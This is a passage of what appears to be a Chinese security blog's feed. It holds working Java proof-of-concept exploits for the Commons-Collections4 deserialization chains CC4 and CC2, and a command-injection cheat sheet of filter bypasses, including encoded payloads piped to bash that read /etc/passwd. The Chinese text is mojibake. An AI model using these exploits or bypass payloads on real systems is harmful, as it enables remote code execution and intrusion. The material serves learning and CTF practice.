needed,</span></span><br><span class="line">    <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">    <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ </p><p><strong>demo1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br></pre></td></tr></table></figure><p>ä½†è¿™æ ·æ˜¯æ‰§è¡Œä¸äº†çš„</p><p>é—®é¢˜å‡ºåœ¨<code>heapify()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¿›å…¥åˆ°è¿™ä¸ªforå¾ªç¯æ—¶sizeä¸º0ï¼Œè€Œå¿…é¡»è¦size&gt;&#x3D;2æ‰èƒ½èµ°åˆ°<code>siftDown()</code>ï¼Œæ„é€ </p><p><strong>demo2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>é—®é¢˜å‡ºåœ¨<code>add()</code>ï¼Œå…¶å®å°±å’Œä¹‹å‰é“¾å­é‡Œçš„<code>put()</code>ä¸€æ ·ï¼Œä¼šå¯¼è‡´æå‰è°ƒç”¨å‡½æ•°</p><p><a href="https://imgse.com/i/ppmUnr4"><img src="https://s1.ax1x.com/2023/03/08/ppmUnr4.png" alt="ppmUnr4.png"></a></p><p>è§£å†³æ–¹æ³•ä¹Ÿå’Œputä¸€æ ·ï¼Œå…ˆä¼ å…¥æ²¡ç”¨çš„å†…å®¹ï¼Œç„¶åå†åºåˆ—åŒ–ä¹‹å‰é€šè¿‡åå°„æ”¹æˆæƒ³è¦çš„å€¼</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ä»£ç \\javaä»£ç \\ccé“¾\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"><span class="comment">//                templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers_exec);</span><br><span class="line"><span class="comment">//        chain.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,chain);</span><br><span class="line"></span><br><span class="line">        serilize(priorityQueue);</span><br><span class="line">        unserlize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserlize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppmUQaR"><img src="https://s1.ax1x.com/2023/03/08/ppmUQaR.png" alt="ppmUQaR.png"></a></p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><h3 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h3><p><a href="https://imgse.com/i/ppmUcQS"><img src="https://s1.ax1x.com/2023/03/08/ppmUcQS.png" alt="ppmUcQS.png"></a></p><p>å‰é¢æ˜¯CC4ï¼Œåé¢æ˜¯CC1å’ŒCC3ï¼Œä¸åšå…·ä½“åˆ†æäº†</p><p><strong>POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"><span class="comment">//                templates.newTransformer();</span></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        chain.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unseralize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/ppmdkcT"><img src="https://s1.ax1x.com/2023/03/08/ppmdkcT.png" alt="ppmdkcT.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rce?</title>
      <link href="/2022/10/07/rce/"/>
      <url>/2022/10/07/rce/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œ-rce"><a href="#å‘½ä»¤æ‰§è¡Œ-rce" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ(rce)"></a>å‘½ä»¤æ‰§è¡Œ(rce)</h1><p><strong>ä»£ç æ‰§è¡Œå‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">create_function()</span><br><span class="line">preg_replace() +/eæ¨¡å¼(PHPç‰ˆæœ¬&lt;5.5.0)</span><br><span class="line">call_user_func()</span><br><span class="line"></span><br><span class="line">//Javascript</span><br><span class="line">eval()</span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤æ‰§è¡Œå‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">system()</span><br><span class="line">exec()  //æ— å›æ˜¾</span><br><span class="line">passthru() </span><br><span class="line">shell_exec()</span><br><span class="line">``åå¼•å·</span><br><span class="line"></span><br><span class="line">//python</span><br><span class="line">popen()</span><br><span class="line">proc_open() </span><br><span class="line">exec()</span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤è¿æ¥ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A;B //å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB</span><br><span class="line"></span><br><span class="line">A|B //åªæ‰§è¡ŒBé‚£æ¡å‘½ä»¤</span><br><span class="line"> </span><br><span class="line">A||B //Aæ‰§è¡Œå¤±è´¥æ‰ä¼šæ‰§è¡ŒB</span><br><span class="line"></span><br><span class="line">A&amp;B //ABä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line"> </span><br><span class="line">A&amp;&amp;B //Aæ‰§è¡ŒæˆåŠŸæ‰ä¼šæ‰§è¡ŒB</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§ç»•è¿‡"><a href="#å¸¸è§ç»•è¿‡" class="headerlink" title="å¸¸è§ç»•è¿‡"></a>å¸¸è§ç»•è¿‡</h1><p>ç»•è¿‡ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;å’Œ&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20(space)</span><br><span class="line">%09(tab)</span><br></pre></td></tr></table></figure><p>ç»•è¿‡<strong>flag</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;cat $a$b</span><br><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line">fl\ag</span><br><span class="line">cat f&quot;&quot;lag</span><br><span class="line">cat f*</span><br><span class="line">cat f???</span><br><span class="line">cat ????.???</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡cat</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nl</span><br><span class="line">head</span><br><span class="line">tail</span><br><span class="line">ca\t</span><br><span class="line">more</span><br><span class="line">tac</span><br><span class="line">sort</span><br><span class="line">od</span><br><span class="line">uniq</span><br><span class="line">less</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= #çŸ­æ ‡ç­¾</span><br><span class="line">Php #å¤§å°å†™</span><br></pre></td></tr></table></figure><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><p><strong>hexç¼–ç (åå…­è¿›åˆ¶ï¼‰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202F6574632F706173737764&quot;</span> | xxd -r -p|bash   <span class="comment">#cat /etc/passwd</span></span><br></pre></td></tr></table></figure><p><strong>octç¼–ç (å…«è¿›åˆ¶)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)  <span class="comment">#ls</span></span><br></pre></td></tr></table></figure><p><strong>base64ç¼–ç </strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y2F0IC9ldGMvcGFzc3dk <span class="comment">#cat /etc/passwd</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure><h2 id="æ‹¼æ¥ç»•è¿‡"><a href="#æ‹¼æ¥ç»•è¿‡" class="headerlink" title="æ‹¼æ¥ç»•è¿‡"></a>æ‹¼æ¥ç»•è¿‡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> test.txt</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t /etc/passwd</span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /etc/passwd</span><br><span class="line">c``a``t /etc/passwd</span><br><span class="line">ca\t /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="é€šé…ç¬¦ç»•è¿‡"><a href="#é€šé…ç¬¦ç»•è¿‡" class="headerlink" title="é€šé…ç¬¦ç»•è¿‡"></a>é€šé…ç¬¦ç»•è¿‡</h2><p>Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p><ul><li><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</li><li><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</li></ul><p>ä¾‹å¦‚<code>cat 1.php</code>å¯ä»¥å†™æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] 1.???        #/???/?[a][t]å›å»åŒ¹é…/bin/cat</span><br></pre></td></tr></table></figure><p>åœ¨globé‡Œ</p><p><code>[A-Za-z0-9]</code>ç›¸å½“äºæ‰€æœ‰æ•°å­—å’Œå¤§å°å†™å­—æ¯</p><p><code>[-%]</code> ä»£è¡¨<code>[!â€#$%]</code>è€Œ<code>[az]</code>ä»£è¡¨ä»»ä½•å°å†™å­—æ¯</p><p><code>[@-[]</code>è¡¨ç¤ºå¤§å†™å­—æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. [...]è¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">2. &#123;â€¦&#125;è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼ï¼Œæ¨¡å¼ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚</span><br><span class="line">3. &#123;...&#125;ä¸[...]æœ‰ä¸€ä¸ªé‡è¦çš„åŒºåˆ«ï¼Œå½“åŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ[...]ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ&#123;...&#125;ä¾ç„¶å¯ä»¥å±•å¼€</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> t[a-z]st</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082123331.png" 